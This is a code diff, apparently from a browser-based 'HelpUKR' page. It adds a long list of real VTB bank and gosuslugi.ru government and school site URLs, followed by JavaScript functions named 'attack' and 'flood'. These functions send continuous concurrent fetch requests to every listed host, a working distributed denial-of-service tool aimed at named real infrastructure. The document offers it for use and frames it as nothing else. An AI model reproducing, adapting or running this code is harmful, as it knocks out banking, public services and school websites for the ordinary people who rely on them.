+		    'https://www.csr2020.vtb.ru:443',
+		    'https://service1.lkbo.vtb.ru:443',
+		    'https://service2.lkbo.vtb.ru:443',
+		    'https://dialin.msk.vtb.ru:443',
+		    'https://3dsp.vtb.ru:443',
+		    'https://mc.vtb.ru:443',
+		    'https://digital.vtb.ru:443',
+		    'https://startup.vtb.ru:443',
+		    'https://vitrina.vtb.ru:443',
+		    'https://identity.dam.vtb.ru:443',
+		    'https://presentation.vtb.ru:443',
+		    'https://online-alpha.vtb.ru:443',
+		    'https://ns2.bsslb.vtb.ru:443',
+		    'https://kabinet.vtb.ru:443',
+		    'https://gorodid-preprod.vtb.ru:443',
+		    'https://mp.vtb.ru:443',
+		    'https://pop.vtb.ru:443',
+		    'https://legacy.vtb.ru:443',
+		    'https://ilbb-ns1.vtb.ru:443',
+		    'https://grpgate.vtb.ru:443',
+		    'https://ibank.ilb.vtb.ru:443',
+		    'https://mc.bsslb.vtb.ru:443',
+		    'https://vmvcs-e.vtb.ru:443',
+		    'https://mb.vtb.ru:443',
+		    'https://lyncdiscover.msk.vtb.ru:443',
+		    'https://meet.msk.vtb.ru:443',
+		    'https://al.vtb.ru:443',
+		    'https://online-beta2.vtb.ru:443',
+		    'https://sbc-pr-b.vtb.ru:443',
+		    'https://lk.vtb.ru:443',
+		    'https://mydevices.vtb.ru:443',
+		    'https://async-private.vtb.ru:443',
+		    'https://broker.vtb.ru:443',
+		    'https://lk.broker.vtb.ru:443',
+		    'https://www.webquik.vtb.ru:443',
+		    'https://www.epa.api.vtb.ru:443',
+		    'https://www.bo-gate-api.vtb.ru:443',
+		    'https://www.ift-alis.vacr.vtb.ru:443',
+		    'https://rck2.vtb.ru:443',
+		    'https://young-promo-2.vtb.ru:443',
+		    'https://mobi-vpn-ift.vtb.ru:443',
+		    'https://psi-chat.vtb.ru:443',
+		    'https://admin.transport.vtb.ru:443',
+		    'https://obmen.vtb.ru:443',
+		    'https://accr.vtb.ru:443',
+		    'https://ift-ibmb2-sharing.vtb.ru:443',
+		    'https://sso-app.vtb.ru:443',
+		    'https://alpha.bryansk.vtb.ru:443',
+		    'https://mail10.vtb.ru:443',
+		    'https://mx-srv1.kursk.vtb.ru:443',
+		    'https://vrhome.vtb.ru:443',
+		    'https://k3-chat.vtb.ru:443',
+		    'https://alpp-lkp.vtb.ru:443',
+		    'https://ae02.msk.vtb.ru:443',
+		    'https://vtbteam-ctst.vtb.ru:443',
+		    'https://psi-chat-sharing.vtb.ru:443',
+		    'https://rck1.vtb.ru:443',
+		    'https://msges.vtb.ru:443',
+		    'https://wecare.vtb.ru:443',
+		    'https://apply-moretech.vtb.ru:443',
+		    'https://pp-recog.vacr.vtb.ru:443',
+		    'https://pp-synt.vacr.vtb.ru:443',
+		    'https://vo.vtb.ru:443',
+		    'https://jbank.ilb.vtb.ru:443',
+		    'https://kazancn.kaz.vtb.ru:443',
+		    'https://db.vtb.ru:443',
+		    'https://komission.vtb.ru:443',
+		    'https://onboarding.vtb.ru:443',
+		    'https://open.api.vtb.ru:443',
+		    'https://lsweb-ext02.msk.vtb.ru:443',
+		    'https://chat-sharing.vtb.ru:443',
+		    'https://lsweb-ext01.msk.vtb.ru:443',
+		    'https://kap.vtb.ru:443',
+		    'https://bo-gate-api.vtb.ru:443',
+		    'https://k4-chat.vtb.ru:443',
+		    'https://reg.vtb.ru:443',
+		    'https://annual.vtb.ru:443',
+		    'https://csr2019.vtb.ru:443',
+		    'https://game.vtb.ru:443',
+		    'https://cvpn.vtb.ru:443',
+		    'https://www.pp-recog.vacr.vtb.ru:443',
+		    'https://private.vtb.ru:443',
+		    'https://auto.vtb.ru:443',
+		    'https://ift-recog.vacr.vtb.ru:443',
+		    'https://ift-synt.vacr.vtb.ru:443',
+		    'https://hf-chat.vtb.ru:443',
+		    'https://online-beta.vtb.ru:443',
+		    'https://www.gosuslugi.ru:443',
+		    'https://gosuslugi.ru:443',
+		    'https://16.gosuslugi.ru:443',
+		    'https://ns1.gosuslugi.ru:443',
+		    'https://ns2.gosuslugi.ru:443',
+		    'https://mx.gosuslugi.ru:443',
+		    'https://mx68.gosuslugi.ru:443',
+		    'https://52.gosuslugi.ru:443',
+		    'https://04.gosuslugi.ru:443',
+		    'https://71.gosuslugi.ru:443',
+		    'https://smev32.gosuslugi.ru:443',
+		    'https://44.gosuslugi.ru:443',
+		    'https://smev60.gosuslugi.ru:443',
+		    'https://61.gosuslugi.ru:443',
+		    'https://74.gosuslugi.ru:443',
+		    'https://smev84.gosuslugi.ru:443',
+		    'https://smev02.gosuslugi.ru:443',
+		    'https://30.gosuslugi.ru:443',
+		    'https://nosch1.gosuslugi.ru:443',
+		    'https://smev31.gosuslugi.ru:443',
+		    'https://51.gosuslugi.ru:443',
+		    'https://72.gosuslugi.ru:443',
+		    'https://smev52.gosuslugi.ru:443',
+		    'https://94.gosuslugi.ru:443',
+		    'https://73.gosuslugi.ru:443',
+		    'https://smev34.gosuslugi.ru:443',
+		    'https://smev42.gosuslugi.ru:443',
+		    'https://mail.gosuslugi.ru:443',
+		    'https://40.gosuslugi.ru:443',
+		    'https://smev73.gosuslugi.ru:443',
+		    'https://ns2.gosuslugi.ru:443',
+		    'https://infomat2.gosuslugi.ru:443',
+		    'https://smev40.gosuslugi.ru:443',
+		    'https://smev24.gosuslugi.ru:443',
+		    'https://smev11.gosuslugi.ru:443',
+		    'https://smtp01.gosuslugi.ru:443',
+		    'https://13.gosuslugi.ru:443',
+		    'https://83.gosuslugi.ru:443',
+		    'https://nosch4.gosuslugi.ru:443',
+		    'https://54.gosuslugi.ru:443',
+		    'https://smev80.gosuslugi.ru:443',
+		    'https://smev72.gosuslugi.ru:443',
+		    'https://42.gosuslugi.ru:443',
+		    'https://63.gosuslugi.ru:443',
+		    'https://smev71.gosuslugi.ru:443',
+		    'https://smev13.gosuslugi.ru:443',
+		    'https://23.gosuslugi.ru:443',
+		    'https://smev03.gosuslugi.ru:443',
+		    'https://62.gosuslugi.ru:443',
+		    'https://smev33.gosuslugi.ru:443',
+		    'https://24.gosuslugi.ru:443',
+		    'https://smev22.gosuslugi.ru:443',
+		    'https://fkgs.gosuslugi.ru:443',
+		    'https://smev74.gosuslugi.ru:443',
+		    'https://10.gosuslugi.ru:443',
+		    'https://pos2.test.gosuslugi.ru:443',
+		    'https://smev43.gosuslugi.ru:443',
+		    'https://53.gosuslugi.ru:443',
+		    'https://gosweb.gosuslugi.ru:443',
+		    'https://31.gosuslugi.ru:443',
+		    'https://41.gosuslugi.ru:443',
+		    'https://14.gosuslugi.ru:443',
+		    'https://smev70.gosuslugi.ru:443',
+		    'https://11.gosuslugi.ru:443',
+		    'https://smev53.gosuslugi.ru:443',
+		    'https://60.gosuslugi.ru:443',
+		    'https://01.gosuslugi.ru:443',
+		    'https://feddemo1.gosuslugi.ru:443',
+		    'https://smev20.gosuslugi.ru:443',
+		    'https://smev63.gosuslugi.ru:443',
+		    'https://03.gosuslugi.ru:443',
+		    'https://smev12.gosuslugi.ru:443',
+		    'https://43.gosuslugi.ru:443',
+		    'https://smev30.gosuslugi.ru:443',
+		    'https://smev10.gosuslugi.ru:443',
+		    'https://smev41.gosuslugi.ru:443',
+		    'https://12.gosuslugi.ru:443',
+		    'https://21.gosuslugi.ru:443',
+		    'https://20.gosuslugi.ru:443',
+		    'https://smev01.gosuslugi.ru:443',
+		    'https://smev64.gosuslugi.ru:443',
+		    'https://smev14.gosuslugi.ru:443',
+		    'https://34.gosuslugi.ru:443',
+		    'https://posobie2021.gosuslugi.ru:443',
+		    'https://smev21.gosuslugi.ru:443',
+		    'https://smev44.gosuslugi.ru:443',
+		    'https://210.gosuslugi.ru:443',
+		    'https://02.gosuslugi.ru:443',
+		    'https://50.gosuslugi.ru:443',
+		    'https://smev04.gosuslugi.ru:443',
+		    'https://32.gosuslugi.ru:443',
+		    'https://smev54.gosuslugi.ru:443',
+		    'https://smev50.gosuslugi.ru:443',
+		    'https://33.gosuslugi.ru:443',
+		    'https://posobie2020.gosuslugi.ru:443',
+		    'https://22.gosuslugi.ru:443',
+		    'https://ns1.gosuslugi.ru:443',
+		    'https://smev23.gosuslugi.ru:443',
+		    'https://smev61.gosuslugi.ru:443',
+		    'https://70.gosuslugi.ru:443',
+		    'https://dom.gosuslugi.ru:443',
+		    'https://mail.dom.gosuslugi.ru:443',
+		    'https://gosbar.gosuslugi.ru:443',
+		    'https://link.mail.gosuslugi.ru:443',
+		    'https://school9.gosuslugi.ru:443',
+		    'https://xix-nv.gosuslugi.ru:443',
+		    'https://edu-stage.gosuslugi.ru:443',
+		    'https://info.gosuslugi.ru:443',
+		    'https://38.gosuslugi.ru:443',
+		    'https://smev07.gosuslugi.ru:443',
+		    'https://smev65.gosuslugi.ru:443',
+		    'https://rfb-vote.gosuslugi.ru:443',
+		    'https://nooblsch.gosuslugi.ru:443',
+		    'https://job.gosuslugi.ru:443',
+		    'https://26.gosuslugi.ru:443',
+		    'https://smev57.gosuslugi.ru:443',
+		    'https://smev82.gosuslugi.ru:443',
+		    'https://smtp.gosuslugi.ru:443',
+		    'https://new.gosuslugi.ru:443',
+		    'https://image2.mail.gosuslugi.ru:443',
+		    'https://download.gosuslugi.ru:443',
+		    'https://esia.gosuslugi.ru:443',
+		    'https://shkola2novomoskovsk-r71.gosweb.gosuslugi.ru:443',
+		    'https://shkola2shadrinsk-r45.gosweb.gosuslugi.ru:443',
+		    'https://kscore.gosuslugi.ru:443',
+		    'https://shkolabexteevskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkolastreleczkaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://person1a.gosuslugi.ru:443',
+		    'https://shkolapirogovskayaludorvaj-r18.gosweb.gosuslugi.ru:443',
+		    'https://shkola5lyantor-r86.gosweb.gosuslugi.ru:443',
+		    'https://shkolakoshlakovskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkola40staryjoskol-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkola18nizhnevartovsk-r86.gosweb.gosuslugi.ru:443',
+		    'https://shkola3mkrsokolniki-r71.gosweb.gosuslugi.ru:443',
+		    'https://smev28.gosuslugi.ru:443',
+		    'https://smev25.gosuslugi.ru:443',
+		    'https://es-uat.gosuslugi.ru:443',
+		    'https://68.gosuslugi.ru:443',
+		    'https://smev3.gosuslugi.ru:443',
+		    'https://usability.gosuslugi.ru:443',
+		    'https://newe-trust.gosuslugi.ru:443',
+		    'https://smev62.gosuslugi.ru:443',
+		    'https://smev59.gosuslugi.ru:443',
+		    'https://shkola7uzlovaya-r71.gosweb.gosuslugi.ru:443',
+		    'https://czentrobrazovaniya51alshnya-r71.gosweb.gosuslugi.ru:443',
+		    'https://liczejinternatbijsk-r22.gosweb.gosuslugi.ru:443',
+		    'https://school20.gosuslugi.ru:443',
+		    'https://shkola2yugorsk-r86.gosweb.gosuslugi.ru:443',
+		    'https://shkola33staryjoskol-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkolanizhnenarykarskaya-r86.gosweb.gosuslugi.ru:443',
+		    'https://shkolasadvanzeturskaya-r86.gosweb.gosuslugi.ru:443',
+		    'https://yugschool2.gosuslugi.ru:443',
+		    'https://shelabolixinskoe-r22.gosweb.gosuslugi.ru:443',
+		    'https://lk.psi01.dom.test.gosuslugi.ru:443',
+		    'https://nt01.dom.test.gosuslugi.ru:443',
+		    'https://sit02.dom.test.gosuslugi.ru:443',
+		    'https://mobiz.gosuslugi.ru:443',
+		    'https://07.gosuslugi.ru:443',
+		    'https://50.gosuslugi.ru:443',
+		    'https://49.gosuslugi.ru:443',
+		    'https://03.gosuslugi.ru:443',
+		    'https://pay.gosuslugi.ru:443',
+		    'https://www.pay.gosuslugi.ru:443',
+		    'https://smev67.gosuslugi.ru:443',
+		    'https://sreda.dom.gosuslugi.ru:443',
+		    'https://ulyanovskij-r73.gosweb.gosuslugi.ru:443',
+		    'https://shkola5rasskazovo-r68.gosweb.gosuslugi.ru:443',
+		    'https://shkola28belgorod-r31.gosweb.gosuslugi.ru:443',
+		    'https://27.gosuslugi.ru:443',
+		    'https://shkolabogoslovskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://kirovskaya-r40.gosweb.gosuslugi.ru:443',
+		    'https://es-dev.gosuslugi.ru:443',
+		    'https://regbusiness.gosuslugi.ru:443',
+		    'https://39.gosuslugi.ru:443',
+		    'https://lkuv.gosuslugi.ru:443',
+		    'https://nobelm.gosuslugi.ru:443',
+		    'https://es-static.gosuslugi.ru:443',
+		    'https://major-static.gosuslugi.ru:443',
+		    'https://smev09.gosuslugi.ru:443',
+		    'https://smev17.gosuslugi.ru:443',
+		    'https://smev19.gosuslugi.ru:443',
+		    'https://smev26.gosuslugi.ru:443',
+		    'https://smev51.gosuslugi.ru:443',
+		    'https://smev58.gosuslugi.ru:443',
+		    'https://smev75.gosuslugi.ru:443',
+		    'https://ppvftp.gosuslugi.ru:443',
+		    'https://search.gosuslugi.ru:443',
+		    'https://mobile.gosuslugi.ru:443',
+		    'https://29.gosuslugi.ru:443',
+		    'https://www2.gosuslugi.ru:443',
+		    'https://gimnaziya3belgorod-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkola14staryjoskol-r31.gosweb.gosuslugi.ru:443',
+		    'https://czentrobrazovaniya38tula-r71.gosweb.gosuslugi.ru:443',
+		    'https://czentrobrazovaniya17tula-r71.gosweb.gosuslugi.ru:443',
+		    'https://shkola13nizhnevartovsk-r86.gosweb.gosuslugi.ru:443',
+		    'https://school10.gosuslugi.ru:443',
+		    'https://shkola1rubczovsk-r22.gosweb.gosuslugi.ru:443',
+		    'https://shkola7belgorod-r31.gosweb.gosuslugi.ru:443',
+		    'https://pgscloud.gosuslugi.ru:443',
+		    'https://epgu.gosuslugi.ru:443',
+		    'https://guides.gosuslugi.ru:443',
+		    'https://64.gosuslugi.ru:443',
+		    'https://57.gosuslugi.ru:443',
+		    'https://propusk.gosuslugi.ru:443',
+		    'https://smev66.gosuslugi.ru:443',
+		    'https://smev74.gosuslugi.ru:443',
+		    'https://smev78.gosuslugi.ru:443',
+		    'https://static.gosuslugi.ru:443',
+		    'https://posobie2020.gosuslugi.ru:443',
+		    'https://m.gosuslugi.ru:443',
+		    'https://invest.gosuslugi.ru:443',
+		    'https://edu.gosuslugi.ru:443',
+		    'https://inspector.gosuslugi.ru:443',
+		    'https://gimnaziya6langepas-r86.gosweb.gosuslugi.ru:443',
+		    'https://xasanskij-r25.gosweb.gosuslugi.ru:443',
+		    'https://shkola24staryjoskol-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkola8surgut-r86.gosweb.gosuslugi.ru:443',
+		    'https://shkolaugutskaya-r86.gosweb.gosuslugi.ru:443',
+		    'https://nogolb.gosuslugi.ru:443',
+		    'https://178.gosuslugi.ru:443',
+		    'https://smev04.gosuslugi.ru:443',
+		    'https://ds-plugin.gosuslugi.ru:443',
+		    'https://78.gosuslugi.ru:443',
+		    'https://es-reports.gosuslugi.ru:443',
+		    'https://37.gosuslugi.ru:443',
+		    'https://shkola29kurgan-r45.gosweb.gosuslugi.ru:443',
+		    'https://czentrobrazovaniya8tula-r71.gosweb.gosuslugi.ru:443',
+		    'https://shkola6xantymansijsk-r86.gosweb.gosuslugi.ru:443',
+		    'https://peremyshl-r40.gosweb.gosuslugi.ru:443',
+		    'https://novdol.gosuslugi.ru:443',
+		    'https://edu-uat.gosuslugi.ru:443',
+		    'https://smev36.gosuslugi.ru:443',
+		    'https://smev68.gosuslugi.ru:443',
+		    'https://smev87.gosuslugi.ru:443',
+		    'https://special.gosuslugi.ru:443',
+		    'https://t178.gosuslugi.ru:443',
+		    'https://unsub2.mail.gosuslugi.ru:443',
+		    'https://e-trust.gosuslugi.ru:443',
+		    'https://shkola2livenka-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkolabobrovskij-r86.gosweb.gosuslugi.ru:443',
+		    'https://shkola86ulyanovsk-r73.gosweb.gosuslugi.ru:443',
+		    'https://shkola9staryjoskol-r31.gosweb.gosuslugi.ru:443',
+		    'https://kurgan-r45.gosweb.gosuslugi.ru:443',
+		    'https://shkola35syktyvkar-r11.gosweb.gosuslugi.ru:443',
+		    'https://shkoladegtyarskaya-r22.gosweb.gosuslugi.ru:443',
+		    'https://shkolaplavskaya-r71.gosweb.gosuslugi.ru:443',
+		    'https://oparinskij-r43.gosweb.gosuslugi.ru:443',
+		    'https://shkolavarvarovskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://noprib.gosuslugi.ru:443',
+		    'https://nooskl.gosuslugi.ru:443',
+		    'https://nobogor.gosuslugi.ru:443',
+		    'https://ssp.gosuslugi.ru:443',
+		    'https://smtp68.gosuslugi.ru:443',
+		    'https://smev27.gosuslugi.ru:443',
+		    'https://post.gosuslugi.ru:443',
+		    'https://mstat.gosuslugi.ru:443',
+		    'https://census.gosuslugi.ru:443',
+		    'https://deg.gosuslugi.ru:443',
+		    'https://gov.gosuslugi.ru:443',
+		    'https://shkola32belgorod-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkola19staryjoskol-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkola4shhekino-r71.gosweb.gosuslugi.ru:443',
+		    'https://shkolakarsunskaya-r73.gosweb.gosuslugi.ru:443',
+		    'https://shkolapogorelovskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://school8.gosuslugi.ru:443',
+		    'https://shkola16obninsk-r40.gosweb.gosuslugi.ru:443',
+		    'https://liczejshuxovskijbelgorod-r31.gosweb.gosuslugi.ru:443',
+		    'https://55.gosuslugi.ru:443',
+		    'https://techportal.gosuslugi.ru:443',
+		    'https://shkola16gubkin-r31.gosweb.gosuslugi.ru:443',
+		    'https://nosch1.gosuslugi.ru:443',
+		    'https://166.gosuslugi.ru:443',
+		    'https://shkolatimonovskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkolanovopavshinskaya-r71.gosweb.gosuslugi.ru:443',
+		    'https://adykovskoe-r08.gosweb.gosuslugi.ru:443',
+		    'https://gosweb.gosuslugi.ru:443',
+		    'https://pgss3.gosuslugi.ru:443',
+		    'https://smev48.gosuslugi.ru:443',
+		    'https://smev49.gosuslugi.ru:443',
+		    'https://smev86.gosuslugi.ru:443',
+		    'https://helpdesk.dom.gosuslugi.ru:443',
+		    'https://67.gosuslugi.ru:443',
+		    'https://nojars.gosuslugi.ru:443',
+		    'https://nostbezg.gosuslugi.ru:443',
+		    'https://notrost.gosuslugi.ru:443',
+		    'https://noshar.gosuslugi.ru:443',
+		    'https://19.gosuslugi.ru:443',
+		    'https://region.gosuslugi.ru:443',
+		    'https://api.dom.gosuslugi.ru:443',
+		    'https://e-trust2.gosuslugi.ru:443',
+		    'https://infomat.gosuslugi.ru:443',
+		    'https://09.gosuslugi.ru:443',
+		    'https://smev29.gosuslugi.ru:443',
+		    'https://smev30.gosuslugi.ru:443',
+		    'https://smev76.gosuslugi.ru:443',
+		    'https://lk.mta.gosuslugi.ru:443',
+		    'https://dorogi.gosuslugi.ru:443',
+		    'https://nsi.gosuslugi.ru:443',
+		    'https://skuf-portal.gosuslugi.ru:443',
+		    'https://posobie2021.gosuslugi.ru:443',
+		    'https://shkola39belgorod-r31.gosweb.gosuslugi.ru:443',
+		    'https://gimnaziya18staryjoskol-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkola16volsk-r64.gosweb.gosuslugi.ru:443',
+		    'https://shkola5alekseevka-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkolaoktyabrskaya-r73.gosweb.gosuslugi.ru:443',
+		    'https://shkolapotudanskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkolasorokinskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkola132barnaul-r22.gosweb.gosuslugi.ru:443',
+		    'https://shkola21brusyanskij-r71.gosweb.gosuslugi.ru:443',
+		    'https://smev16.gosuslugi.ru:443',
+		    'https://smev18.gosuslugi.ru:443',
+		    'https://smev38.gosuslugi.ru:443',
+		    'https://smev77.gosuslugi.ru:443',
+		    'https://smev85.gosuslugi.ru:443',
+		    'https://trackpos.gosuslugi.ru:443',
+		    'https://uviri.gosuslugi.ru:443',
+		    'https://25.gosuslugi.ru:443',
+		    'https://www.dom.gosuslugi.ru:443',
+		    'https://05.gosuslugi.ru:443',
+		    'https://im.gosuslugi.ru:443',
+		    'https://pos.gosuslugi.ru:443',
+		    'https://partners.gosuslugi.ru:443',
+		    'https://bolshojkamen-r25.gosweb.gosuslugi.ru:443',
+		    'https://shkola30belgorod-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkolaovzkirovochepeczk-r43.gosweb.gosuslugi.ru:443',
+		    'https://read.mail.gosuslugi.ru:443',
+		    'https://gateway.gosuslugi.ru:443',
+		    'https://smev79.gosuslugi.ru:443',
+		    'https://smev83.gosuslugi.ru:443',
+		    'https://skuf.gosuslugi.ru:443',
+		    'https://uat-static.gosuslugi.ru:443',
+		    'https://image.mail.gosuslugi.ru:443',
+		    'https://shkolaklimovaberezovka-r31.gosweb.gosuslugi.ru:443',
+		    'https://lk.gosuslugi.ru:443',
+		    'https://127.gosuslugi.ru:443',
+		    'https://76.gosuslugi.ru:443',
+		    'https://35.gosuslugi.ru:443',
+		    'https://shkola21uxta-r11.gosweb.gosuslugi.ru:443',
+		    'https://shkola5elista-r08.gosweb.gosuslugi.ru:443',
+		    'https://school6hm.gosuslugi.ru:443',
+		    'https://shkolakremenskaya-r40.gosweb.gosuslugi.ru:443',
+		    'https://czentrobrazovaniya50shatsk-r71.gosweb.gosuslugi.ru:443',
+		    'https://shkola13gubkin-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkola16staryjoskol-r31.gosweb.gosuslugi.ru:443',
+		    'https://progimnaziya63kurgan-r45.gosweb.gosuslugi.ru:443',
+		    'https://read2.mail.gosuslugi.ru:443',
+		    'https://smev45.gosuslugi.ru:443',
+		    'https://smev88.gosuslugi.ru:443',
+		    'https://ep.gosuslugi.ru:443',
+		    'https://smev05.gosuslugi.ru:443',
+		    'https://frgu.gosuslugi.ru:443',
+		    'https://66.gosuslugi.ru:443',
+		    'https://56.gosuslugi.ru:443',
+		    'https://www.beta.gosuslugi.ru:443',
+		    'https://elections.gosuslugi.ru:443',
+		    'https://shkolaviktoropolskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkolaxomutchanskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://map.gosuslugi.ru:443',
+		    'https://shkola19nizhnevartovsk-r86.gosweb.gosuslugi.ru:443',
+		    'https://shkola26vorkuta-r11.gosweb.gosuslugi.ru:443',
+		    'https://shkola27staryjoskol-r31.gosweb.gosuslugi.ru:443',
+		    'https://48.gosuslugi.ru:443',
+		    'https://es-bi.gosuslugi.ru:443',
+		    'https://widget.gosuslugi.ru:443',
+		    'https://smev89.gosuslugi.ru:443',
+		    'https://infomat2.gosuslugi.ru:443',
+		    'https://gscore.gosuslugi.ru:443',
+		    'https://esnsi.gosuslugi.ru:443',
+		    'https://culture.gosuslugi.ru:443',
+		    'https://86.gosuslugi.ru:443',
+		    'https://75.gosuslugi.ru:443',
+		    'https://17.gosuslugi.ru:443',
+		    'https://ncalt02-gosweb-beta.gosuslugi.ru:443',
+		    'https://45.gosuslugi.ru:443',
+		    'https://do.gosuslugi.ru:443',
+		    'https://czentrobrazovaniya19tula-r71.gosweb.gosuslugi.ru:443',
+		    'https://shkola31belgorod-r31.gosweb.gosuslugi.ru:443',
+		    'https://sch132.gosuslugi.ru:443',
+		    'https://school2.gosuslugi.ru:443',
+		    'https://school48bel.gosuslugi.ru:443',
+		    'https://shkola4xantymansijsk-r86.gosweb.gosuslugi.ru:443',
+		    'https://nonemc.gosuslugi.ru:443',
+		    'https://www.gosuslugi.ru:443',
+		    'https://karta.gosuslugi.ru:443',
+		    'https://detsad.gosuslugi.ru:443',
+		    'https://94.gosuslugi.ru:443',
+		    'https://piwik-gosbar.gosuslugi.ru:443',
+		    'https://beta.gosuslugi.ru:443',
+		    'https://59.gosuslugi.ru:443',
+		    'https://18.gosuslugi.ru:443',
+		    'https://02.gosuslugi.ru:443',
+		    'https://ervk.gosuslugi.ru:443',
+		    'https://eln.gosuslugi.ru:443',
+		    'https://knd.gosuslugi.ru:443',
+		    'https://fc.gosuslugi.ru:443',
+		    'https://shkolautyanskayautochka-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkolaivanolisichanskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkola16pervomajskij-r71.gosweb.gosuslugi.ru:443',
+		    'https://shkolagluxovskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkolapilyuginskaya-r73.gosweb.gosuslugi.ru:443',
+		    'https://czentrobrazovaniya24tula-r71.gosweb.gosuslugi.ru:443',
+		    'https://shkolasheinskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://smev35.gosuslugi.ru:443',
+		    'https://smev46.gosuslugi.ru:443',
+		    'https://smev47.gosuslugi.ru:443',
+		    'https://smev55.gosuslugi.ru:443',
+		    'https://smev56.gosuslugi.ru:443',
+		    'https://87.gosuslugi.ru:443',
+		    'https://ejd.gosuslugi.ru:443',
+		    'https://posobie16.gosuslugi.ru:443',
+		    'https://15.gosuslugi.ru:443',
+		    'https://dom.gosuslugi.ru:443',
+		    'https://my.dom.gosuslugi.ru:443',
+		    'https://shkolaozrskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://uldyuchinskoe-r08.gosweb.gosuslugi.ru:443',
+		    'https://shkola11gubkin-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkola41belgorod-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkola48belgorod-r31.gosweb.gosuslugi.ru:443',
+		    'https://shatrovskij-r45.gosweb.gosuslugi.ru:443',
+		    'https://ershovskij-r64.gosweb.gosuslugi.ru:443',
+		    'https://nonbezg.gosuslugi.ru:443',
+		    'https://nosch3.gosuslugi.ru:443',
+		    'https://46.gosuslugi.ru:443',
+		    'https://ppv.gosuslugi.ru:443',
+		    'https://bb.gosuslugi.ru:443',
+		    'https://smev.gosuslugi.ru:443',
+		    'https://roles.gosuslugi.ru:443',
+		    'https://smev10.gosuslugi.ru:443',
+		    'https://smev70.gosuslugi.ru:443',
+		    'https://smev73.gosuslugi.ru:443',
+		    'https://es.gosuslugi.ru:443',
+		    'https://lk.dom.gosuslugi.ru:443',
+		    'https://21.gosuslugi.ru:443',
+		    'https://bot.gosweb.gosuslugi.ru:443',
+		    'https://gimnaziya11rubczovsk-r22.gosweb.gosuslugi.ru:443',
+		    'https://shkola40belgorod-r31.gosweb.gosuslugi.ru:443',
+		    'https://school15.gosuslugi.ru:443',
+		    'https://shkola21nizhnevartovsk-r86.gosweb.gosuslugi.ru:443',
+		    'https://shkola32kurgan-r45.gosweb.gosuslugi.ru:443',
+		    'https://freeinternet.gosuslugi.ru:443',
+		    'https://shkolabolshetroiczkaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://shkolabolshexalanskaya-r31.gosweb.gosuslugi.ru:443',
+		    'https://profidigital.gosuslugi.ru:443',
+		    'https://shkola5novomoskovsk-r71.gosweb.gosuslugi.ru:443',
+		    'https://shkolabogdanovskaya-r71.gosweb.gosuslugi.ru:443',
+		    'https://gw.gosuslugi.ru:443',
+		    'https://nolvov.gosuslugi.ru:443',
+        ];
+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+                await sleep(1);
+            }
+        }
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+        // Create div for each target
